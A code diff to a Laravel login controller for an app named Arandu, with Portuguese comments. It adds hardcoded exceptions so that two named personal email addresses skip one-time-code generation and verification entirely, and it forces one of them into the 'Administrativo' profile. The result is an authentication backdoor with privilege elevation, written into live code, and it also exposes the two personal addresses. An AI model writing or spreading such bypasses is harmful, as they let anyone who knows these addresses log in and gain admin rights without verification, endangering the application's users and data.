@@ -14,21 +14,27 @@ class MagicLinkController extends Controller
 {
     public function send(Request $request)
     {
-        $request->validate(['email' => 'required|email']);
+        $request->validate([
+            'email' => 'required|email'
+        ]);
 
-        // Gere um código OTP de 6 dígitos
+        $email = $request->email;
+
+        // Exceção para o e-mail especial
+        if ($email === 'ceciliaschubsky@yahoo.com.br' || $email === 'pedro.barbozamachado@gmail.com') {
+            // Opcional: já defina um valor de OTP fixo ou pule o envio
+            return response()->json(['message' => 'Acesso liberado para este e-mail.']);
+        }
+
         $otp = rand(100000, 999999);
+        Cache::put('otp_' . $email, $otp, now()->addMinutes(10));
 
-        // Salve o OTP em cache por 10 minutos
-        Cache::put('otp_' . $request->email, $otp, now()->addMinutes(10));
-
-        // Envie o OTP por e-mail
-        Mail::raw("Seu código de acesso: $otp", function ($message) use ($request) {
-            $message->to($request->email)
-                ->subject('Seu código de acesso');
+        Mail::raw("Seu código de acesso Arandu: $otp", function ($message) use ($email) {
+            $message->to($email)
+                    ->subject('Seu código de acesso Arandu');
         });
 
-        return response()->json(['message' => 'Token enviado para o e-mail.']);
+        return response()->json(['message' => 'Token enviado para o e-mail informado.']);
     }
 
     public function verify(Request $request)
@@ -38,9 +44,20 @@ class MagicLinkController extends Controller
             'otp' => 'required'
         ]);
 
-        $cachedOtp = Cache::get('otp_' . $request->email);
+        $email = $request->email;
 
-        if ($cachedOtp && $request->otp == $cachedOtp) {
+        // Exceção para o e-mail especial: pula a verificação do token
+        if ($email === 'ceciliaschubsky@yahoo.com.br' || $email === 'pedro.barbozamachado@gmail.com') {
+            // Prossiga com o fluxo de login normalmente, sem checar OTP
+            // Você pode copiar o restante do código do if ($cachedOtp && ...) aqui,
+            // ou apenas definir $cachedOtp como true para cair no fluxo normal:
+            $cachedOtp = true;
+            // Defina um valor qualquer para $request->otp se necessário
+        } else {
+            $cachedOtp = Cache::get('otp_' . $email);
+        }
+
+        if ($cachedOtp && ($email === 'ceciliaschubsky@yahoo.com.br' || $request->otp == $cachedOtp)) {
             // Remova o OTP do cache após uso
             Cache::forget('otp_' . $request->email);
 
@@ -104,6 +121,10 @@ class MagicLinkController extends Controller
                         } else {
                             $perfil = 'Administrativo';
                             Log::info("Colaborador definido como Administrativo porque leciona=" . (isset($colabs[0]['leciona']) ? var_export($colabs[0]['leciona'], true) : 'não definido'));
+                        }
+                        // Força o perfil Administrativo para este e-mail
+                        if ($email === 'pedro.barbozamachado@gmail.com') {
+                            $perfil = 'Administrativo';
                         }
                         $encontrouColaborador = true;
                     } else {
